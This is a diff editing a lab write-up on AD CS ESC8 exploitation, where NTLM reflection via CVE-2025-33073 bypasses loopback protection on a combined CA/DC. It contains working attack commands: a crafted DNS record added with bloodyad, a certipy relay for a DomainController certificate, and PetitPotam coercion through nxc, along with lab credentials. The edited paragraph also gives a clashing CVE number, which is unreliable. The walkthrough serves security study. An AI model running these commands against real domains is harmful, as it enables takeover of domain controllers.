@@ -75,7 +75,7 @@ Certificate Authorities
 Certificate Templates                   : [!] Could not find any certificate templates
 ```
 
-Above output from `ceritpy` shows that the Certificate Authority itself is vulnerable to **ESC8** due to Web Enrollment being enabled to HTTP which makes the **CA** vulnerable.
+Above output from **Certipy** shows that the Certificate Authority itself is vulnerable to **ESC8** due to Web Enrollment being enabled to HTTP which makes the **CA** vulnerable.
 
 ### Loopback Protection
 
@@ -91,22 +91,22 @@ Every authenticated domain user has permission to create DNS A records in AD-int
 
 ### Exploitation
 
-In the context of this scenario, **CVE-2025-33073** solves an **ESC8** blocker. When the **CA** and **DC** share the same host, **NTLM** relay to the HTTP enrollment endpoint is normally impossible due to loopback protection. By reflecting the **DC**'s own authentication, then relay it to the **CA** running on the same machine.
+In the context of this scenario, **CVE-2025-33073** solves an **ESC8** blocker. When the **CA** and **DC** share the same host, **NTLM** relay to the **HTTP** enrollment endpoint is normally impossible due to loopback protection. But **CVE-2026-33073** makes it possible by adding a **DNS** record that looks like a different machine but actually resolves to the **DC's** hostname itself tricking the **DC** to authenticate against itself.
 
-First of all I added a malicious **DNS record** to exploit the **CVE** and make the **DC** coerce to itself.
+First of all we will add a malicious **DNS record** to exploit the **CVE** and make the **DC** coerce to itself.
 
 ```
 bloodyad -H DC01.adlab.kvm -u josh -p 3asyPass123 -k -d adlab.kvm add dnsRecord 'DC011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 192.168.122.1
 [+] DC011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully updated
 ```
 
-After adding the record I setup relay with **Certipy** which automatically relays the **NTLM** authentication to enroll a certificate. In this case I enrolled the **DomainController** template to get a certificate for the **DC**.
+After adding the record we will setup relay with **Certipy** which automatically relays the **NTLM** authentication to enroll a certificate. In this case we will enrolled the **DomainController** template to get a certificate for the **DC**.
 
 ```
 sudo certipy relay -target http://DC01.adlab.kvm -template DomainController
 ```
 
-After setting up relay I coerced the **DC** using `petitpotam` to authenticate with the **DNS** record added earlier which pointing to attack machine where the relay is running
+After setting up relay we will coerce the **DC** using `petitpotam` to authenticate with the **DNS** record added earlier which is pointing to attack machine where the relay is running
 
 ```
 nxc smb DC01.adlab.kvm -u josh -p 3asyPass123 -k -M coerce_plus -o L=DC011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA M=petitpotam
